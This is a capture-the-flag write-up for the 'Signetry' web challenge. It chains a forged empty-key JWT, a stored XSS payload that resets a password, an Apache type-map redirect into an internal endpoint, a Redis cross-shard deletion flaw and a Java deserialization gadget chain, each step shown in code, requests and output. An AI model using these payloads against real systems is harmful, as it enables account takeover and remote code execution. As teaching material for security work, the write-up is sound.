# Signetry Writeup

## Challenge

**Event:** Cyber Apocalypse CTF 2026: The Salt Crown  
**Category:** Web  
**Challenge:** Signetry  

**Flag:**

```text
HTB{the_se4l_certifies_canon_n0t_contraband_4c758db499a41e839f50a0584f709581}
```

## The short version

This was not one giant bug. It was a chain of smaller bugs spread across the Go
gateway, React frontend, Apache, Redis, and a Java/DL4J model registry:

1. Forge a password-reset JWT because QOR Auth signs it with an empty HMAC key.
2. Reset and enter the built-in maintainer account.
3. Submit a stored XSS payload as an appeal.
4. Upload an Apache type-map that internally redirects to a blocked dispatch
   endpoint.
5. The dispatch endpoint sends an authenticated service bot to the appeal page.
6. Our XSS runs as that bot and resets the curator's password.
7. Abuse a cross-shard Redis deletion to make a malicious model look sealed.
8. Have the curator finalize that model.
9. DL4J deserializes `preprocessor.bin`, giving command execution in the Java
   registry.
10. Read `/flag.txt` and publish it as an attachment that we can download.

That is a lot of moving pieces, so let us walk through them one at a time.

## Understanding the application

The container runs several services:

| Component | Job |
|---|---|
| Apache | Public entry point and `/uploads` file server |
| Go/React application | Authentication, appeals, and model workflow |
| Warden bot | Headless Chrome reviewer logged in as a service account |
| Two Redis instances | Store staged model data and status markers |
| Java/DL4J registry | Validates and previews finalized neural-network archives |

There are also three useful built-in accounts:

| Account | Role | Important power |
|---|---|---|
| `dms@htb.com` | Maintainer | Stage models, withdraw them, upload attachments, and submit appeals |
| `warden@htb.com` | Service | Review appeals and reset the curator's credential |
| `conservator@htb.com` | Curator | Finalize models |

The random starting passwords mean that simply logging in is not an option. We
need to move through the roles in order: maintainer, service bot, then curator.

## 1. Forging the maintainer's reset token

The Go application initializes QOR Auth like this:

```go
qor := qorauth.New(&qorauth.Config{DB: gormDB})
```

It never configures a signing string. QOR therefore validates its reset JWTs
using an empty HMAC secret. An empty key is still a valid key as far as HMAC is
concerned, so anyone can make a token that passes validation.

The reset handler takes the JWT ID (`jti`) as the account name:

```go
claims, err := a.qor.ValidateClaims(token)
// ...
uid := claims.Id
if uid != MaintainerLogin {
    return "", errors.New("invalid account")
}
```

The token needs only these values:

```json
{"alg":"HS256","typ":"JWT"}
```

```json
{"jti":"dms@htb.com"}
```

We sign `base64url(header) + "." + base64url(payload)` using HMAC-SHA256 and an
empty byte string:

```python
def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

header = b64url(b'{"alg":"HS256","typ":"JWT"}')
payload = b64url(b'{"jti":"dms@htb.com"}')
message = f"{header}.{payload}".encode()
signature = b64url(hmac.new(b"", message, hashlib.sha256).digest())
token = f"{header}.{payload}.{signature}"
```

Then we choose a known maintainer password:

```http
POST /auth/password/update
Content-Type: application/json

{
  "reset_password_token": "<forged token>",
  "new_password": "StormboundRealm2026!"
}
```

After that, we can log in as `dms@htb.com`.

## 2. Turning an appeal into stored XSS

Maintainers may submit appeals. Reviewers later view those appeals in React:

```jsx
<div>
  {parse(a.body, APPEAL_PARSE_OPTIONS)}
</div>
```

There is an attempted blocklist:

```jsx
const BLOCKED_APPEAL_ELEMENTS = new Set([
  'iframe', 'frame', 'frameset', 'object', 'embed',
  'meta', 'base', 'link', 'script'
])

const APPEAL_PARSE_OPTIONS = {
  replace(node) {
    if (BLOCKED_APPEAL_ELEMENTS.has(node.name)) return <></>
  },
}
```

Blocking only a few dangerous tags is not sanitization. An image can also run
JavaScript through an error handler. React would normally make a raw lowercase
`onerror` awkward, but adding the customized built-in attribute `is="x-img"`
causes the attribute to be preserved.

The site's Content Security Policy even allows inline attribute handlers:

```text
script-src-attr 'unsafe-inline'
```

Our appeal is:

```html
<img is="x-img" src="/missing-warden-image"
onerror="fetch('/admin/credential/reset',{
  method:'POST',
  headers:{'Content-Type':'application/json'},
  body:JSON.stringify({
    uid:'conservator@htb.com',
    new_password:'LivingRealm2026!'
  })
})">
```

The nonexistent image cannot be decoded, so `onerror` runs. Because this is a
same-origin `fetch`, the reviewer's session cookie is automatically included.

The endpoint is unavailable to our maintainer, but it is available to the
service role:

```go
RoleService: {
    PermissionReviewAppeals:     true,
    PermissionCredentialReissue: true,
}
```

We now have the trap, but still need to persuade the Warden bot to visit it.

## 3. Reaching the internal dispatch endpoint through Apache

The bot polls an internal queue. The application puts `/admin` in that queue
when `/internal/dispatch` is requested:

```go
func (h *Handler) Dispatch(c *gin.Context) {
    h.bots.Enqueue("/admin")
    c.JSON(http.StatusAccepted, gin.H{"status": "queued for review"})
}
```

Both Apache and Go try to keep `/internal` private. Apache uses:

```apache
RewriteCond %{IS_SUBREQ} =false
RewriteCond %{ENV:REDIRECT_STATUS} =""
RewriteRule ^/internal(/|$) - [F]
```

Direct requests therefore get blocked. However, the upload directory enables
Apache type maps:

```apache
<Directory /var/www/uploads>
    AddHandler type-map .var
    Options +MultiViews
</Directory>
```

The maintainer can upload arbitrary files with safe filenames. We upload
`dispatch.var` with this content:

```text
URI: ../internal/dispatch
Content-Type: application/json; qs=1.0
Content-Language: en

```

We then request:

```http
GET /uploads/dispatch.var
```

Apache's content negotiation processes the type-map and performs an internal
redirect to `/internal/dispatch`. During the redirected request,
`REDIRECT_STATUS` is already set, so the rewrite rule no longer blocks it.
Apache proxies the new request to the Go server over loopback, which also
satisfies Go's `loopbackOnly()` check.

The Warden logs into its service account, receives `/admin` from the queue, and
opens it in headless Chrome. The appeal renders, the missing image errors, and
our stored XSS changes the curator's password.

We can now log in as:

```text
conservator@htb.com : LivingRealm2026!
```

## 4. Making an unsealed model look sealed

The intended model workflow is:

1. A maintainer stages a ZIP.
2. A scanner seals it only if it contains the two canonical files.
3. A curator finalizes the sealed model.
4. The Go gateway sends it to the Java registry.

Our model contains an extra `preprocessor.bin`, so the normal review rejects it:

```go
var canonical = map[string]bool{
    "configuration.json": true,
    "coefficients.bin":   true,
}
```

The useful bug is in the Redis-backed draft store.

### Three keys, possibly three places

For every model token, staging writes:

```text
model:blob:<token>       -> the ZIP itself
model:unsealed:<token>   -> marker
model:intake:<token>     -> marker
```

The application uses a `redis.Ring` with two independent Redis shards. Each key
is hashed separately, so related keys do not necessarily land on the same
server.

Withdrawal tries to delete all three keys in one command:

```go
return d.ring.Del(ctx,
    fmt.Sprintf(unsealedKey, token),
    fmt.Sprintf(intakeKey, token),
    fmt.Sprintf(blobKey, token),
).Result()
```

Here is the catch: the ring chooses a shard for this multi-key `DEL` using its
first key. Redis only sees and deletes keys that exist on that selected shard.
It does not go to the other shard to finish the job.

We want this placement:

```text
Shard A: model:unsealed:<token>
         model:intake:<token>

Shard B: model:blob:<token>
```

`/withdraw` is routed to Shard A by the first, `unsealed`, key. It removes both
markers but cannot remove the blob on Shard B.

The sealing check is only:

```go
func (d *Drafts) Sealed(ctx context.Context, token string) bool {
    if d.ring.Exists(ctx, fmt.Sprintf(unsealedKey, token)).Val() != 0 {
        return false
    }
    return d.ring.Exists(ctx, fmt.Sprintf(intakeKey, token)).Val() == 0
}
```

Both markers are gone, so the model is considered sealed even though it never
passed review. The malicious blob is still present and can be finalized.

With two shards and independent hashes, the desired layout occurs about one
time in four. The solver simply stages and withdraws repeatedly, then checks
`/api/versions/<token>` to see whether the blob survived.

On the remote instance it worked on attempt five:

```text
attempt 1: blob was deleted
attempt 2: blob was deleted
attempt 3: blob was deleted
attempt 4: blob was deleted
attempt 5: retained blob, finalize HTTP 202
```

## 5. The malicious DL4J model

The Java registry first uses DL4J's model validator:

```java
ValidationResult vr =
    DL4JModelValidator.validateMultiLayerNetwork(tmp.toFile());
```

It then queues accepted archives and later restores one:

```java
MultiLayerNetwork net =
    ModelSerializer.restoreMultiLayerNetwork(model.toFile(), false);
```

The archive is based on a legitimate reference network, so these two entries
are valid:

```text
configuration.json
coefficients.bin
```

DL4J also recognizes an optional entry named `preprocessor.bin`. The validator
does not reject that extra entry. During restoration, `ModelSerializer`
deserializes it with Java's `ObjectInputStream`.

Our final archive looks like this:

```text
Archive: evil-model.zip
 Length   Name
 ------   ----
   1615   configuration.json
    153   coefficients.bin
   3069   preprocessor.bin
```

That gives us a classic unsafe Java deserialization target.

### Gadget chain

Commons Collections was deliberately excluded from the Maven dependencies, so
the usual ysoserial chains were not available. A chain using classes already in
Java 11 and DL4J's shaded Jackson worked:

```text
BadAttributeValueExpException.readObject()
  -> POJONode.toString()
  -> Jackson bean serialization
  -> TemplatesImpl.getOutputProperties()
  -> attacker-controlled AbstractTranslet bytecode
```

In plain English:

1. Java reconstructs our exception object.
2. The exception calls `toString()` on a nested Jackson object.
3. Jackson tries to serialize the object and calls one of its getters.
4. That getter makes `TemplatesImpl` load our supplied Java bytecode.
5. The bytecode runs a shell command.

The generated serialized object was stored as `preprocessor.bin`, while the
valid configuration and coefficients were copied from the reference model.
The payload was tested against the challenge's exact Java 11 and DL4J
`1.0.0-M2.1` environment.

An exception after the gadget fires does not matter. The registry catches every
`Throwable`:

```java
} catch (Throwable t) {
    System.out.println(
        "[certifier] preview failed: " +
        t.getClass().getSimpleName()
    );
}
```

By the time that message is printed, our command has already executed.

## 6. Getting the flag back out

The Java registry runs as the unprivileged `registry` user. It can read
`/flag.txt`, but it cannot directly write into `/var/www/uploads`.

We already know the maintainer password, though, and the gateway listens
internally on `127.0.0.1:8090`. The injected translet executes this command:

```sh
wget -qO- \
  --save-cookies /tmp/.c \
  --keep-session-cookies \
  --header='Content-Type: application/json' \
  --post-data='{"login":"dms@htb.com","password":"StormboundRealm2026!"}' \
  http://127.0.0.1:8090/api/login >/dev/null \
&& wget -qO- \
  --load-cookies /tmp/.c \
  --post-file=/flag.txt \
  'http://127.0.0.1:8090/api/attachments?name=garran-oath.txt' >/dev/null
```

The first request logs into the gateway and saves the session cookie. The
second uses the maintainer-only attachment feature to upload `/flag.txt` as
`garran-oath.txt`.

Our external solver then polls:

```http
GET /uploads/garran-oath.txt
```

## Running the exploit

The complete automation is in `solve.py`, and the prepared Java payload is in
`evil-model.zip`.

```bash
python3 solve.py http://154.57.164.65:30549
```

Successful output:

```text
[1] Resetting the maintainer password with the empty-key QOR JWT
[2] Planting the stored XSS used to reset the curator
[3] Uploading a type-map and dispatching the same-origin warden
[4] Exploiting cross-shard DEL until a model is unsealed but retained
    attempt 1: blob was deleted
    attempt 2: blob was deleted
    attempt 3: blob was deleted
    attempt 4: blob was deleted
    attempt 5: retained blob, finalize HTTP 202
[5] Model 775e0995854ccd0f215ee2cb queued; waiting for Java deserialization
[+] HTB{the_se4l_certifies_canon_n0t_contraband_4c758db499a41e839f50a0584f709581}
```

## Why this challenge was fun

Every layer appeared to have a defense:

- reset tokens were signed;
- dangerous appeal tags were blocked;
- the bot could only browse the same origin;
- `/internal` was protected twice;
- models had to be sealed;
- model ZIPs were validated;
- and the obvious Java gadget dependency was removed.

None of those defenses was quite complete. The intended route was to connect
their gaps: empty-key JWT signing, blocklist XSS, an Apache internal redirect,
an inconsistent distributed delete, and finally unsafe Java deserialization.

The main lesson is that security decisions need one reliable source of truth.
In this challenge, “sealed” was inferred from missing Redis markers rather than
recorded as an authenticated state, while “safe model” meant different things
to the Go scanner and the Java loader. Those mismatches are where the whole
chain came from.

